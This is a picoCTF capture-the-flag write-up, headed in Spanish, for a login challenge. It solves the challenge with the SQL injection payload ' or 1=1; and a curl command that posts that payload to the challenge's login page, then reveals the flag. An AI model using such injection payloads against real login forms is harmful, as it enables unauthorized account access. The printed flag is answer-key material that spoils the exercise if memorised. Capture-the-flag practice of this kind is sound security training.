## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
## Solución
```
username: ' or 1=1;
password: admins
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admins'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
```
## Solución 2
```bash
victormcm-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username='or 1=1;&password=admin"
<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p>victormcm-picoctf@webshell:~$ 
```
## Notas Adicionales


## Referencias
https://www.w3schools.com/sql/sql_injection.asp